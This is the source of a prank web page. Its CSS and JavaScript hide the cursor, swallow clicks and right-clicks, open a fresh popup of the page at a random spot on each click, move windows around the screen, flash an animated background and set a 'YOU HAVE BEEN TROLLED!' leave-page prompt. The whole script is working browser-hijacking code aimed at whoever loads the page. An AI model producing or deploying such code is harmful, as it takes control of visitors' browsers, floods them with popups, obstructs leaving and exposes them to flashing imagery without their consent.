<style>
#nope {
    cursor: none;
    top: 0;
    left: 0;
    width: 100%;
    height: 100%;
    position: fixed;
    z-index: 9999;
}

.marquee-container {
    overflow: hidden;
    height: 100vh;
}

.marquee {
    display: flex;
    flex-wrap: wrap;
    flex-direction: row;
    animation: marquee 6s linear infinite;
}

.marquee-img {
    flex-shrink: 0;
    height: 100%;
    margin-right: 10px;
}

@keyframes marquee {
    0% {
        transform: translateY(0);
    }
    100% {
        transform: translateY(-100%);
    }
}

.glitch {
    position: fixed;
    top: 0;
    left: 0;
    width: 100%;
    height: 100%;
    background-image: url('/images/w164zw.gif');
    background-size: cover;
    background-repeat: no-repeat;
    animation: flash 2s infinite;
    z-index: -1;
}

@-webkit-keyframes flash {
      0% { opacity: 1; }
     49% { opacity: 1; }
     50% { opacity: 0; }
    100% { opacity: 0; }
}
</style>

<script>
document.body.scrollTop = 0; // For Safari
document.documentElement.scrollTop = 0; // For Chrome, Firefox, IE and Opera

        window.onbeforeunload = function() {
            return "YOU HAVE BEEN TROLLED!";
        };

    var clickCount = 0;

document.addEventListener('click', function(event) {
    event.preventDefault();
    haha();
});

document.addEventListener('contextmenu', function(event) {
    event.preventDefault();
    haha();
});

function haha() {
    var w = window.open(location.href, "_blank", "width=400,height=300");
    w.resizeTo(400*1.5, 299*1.5);
    w.moveTo(Math.floor((Math.random()*window.screen.availWidth)+1), Math.floor((Math.random()*window.screen.availHeight)+1));
}

    var xPos = 0;
    var yPos = 0;
    var xOff = 5;
    var yOff = 5;
    var flagrun = 1;

    function newXlt() {
        xOff = Math.ceil(0 - 6 * Math.random()) * 5 - 10;
        window.focus();
    }

    function newXrt() {
        xOff = Math.ceil(7 * Math.random()) * 5 - 10;
    }

    function newYup() {
        yOff = Math.ceil(0 - 6 * Math.random()) * 5 - 10;
    }

    function newYdn() {
        yOff = Math.ceil(7 * Math.random()) * 5 - 10;
    }

    function fOff() {
        flagrun = 0;
    }

    function playBall() {
        xPos += xOff;
        yPos += yOff;
        if (xPos > screen.width - 299) {
            newXlt();
        }
        if (xPos < 0) {
            newXrt();
        }
        if (yPos > screen.height - 400) {
            newYup();
        }
        if (yPos < 0) {
            newYdn();
        }
        if (flagrun == 1) {
            window.moveTo(xPos, yPos);
            setTimeout(playBall, 1);
        }
    }

document.addEventListener("DOMContentLoaded", function() {
    var images = document.querySelectorAll(".marquee img");
    images.forEach(function(img) {
        img.setAttribute("data-src", img.getAttribute("src"));
        img.removeAttribute("src");
    });
    lazyLoadImages();
});

function lazyLoadImages() {
    var images = document.querySelectorAll(".marquee img[data-src]");
    images.forEach(function(img) {
        if (isElementInViewport(img)) {
            img.setAttribute("src", img.getAttribute("data-src"));
            img.removeAttribute("data-src");
        }
    });
}

function isElementInViewport(el) {
    var rect = el.getBoundingClientRect();
    return (
        rect.top >= 0 &&
        rect.left >= 0 &&
        rect.bottom <= (window.innerHeight || document.documentElement.clientHeight) &&
        rect.right <= (window.innerWidth || document.documentElement.clientWidth)
    );
}

window.addEventListener("scroll", lazyLoadImages);
window.addEventListener("resize", lazyLoadImages);
window.addEventListener("orientationchange", lazyLoadImages);


function bg() {
    var images = [
        "/images/HNZS.png",
        "/images/YnzJ.png",
        "/images/t6uno3.png"
    ];
    var randomIndex = Math.floor(Math.random() * images.length);
    var randomImage = images[randomIndex];
    document.body.style.backgroundImage = "url('" + randomImage + "')";
}
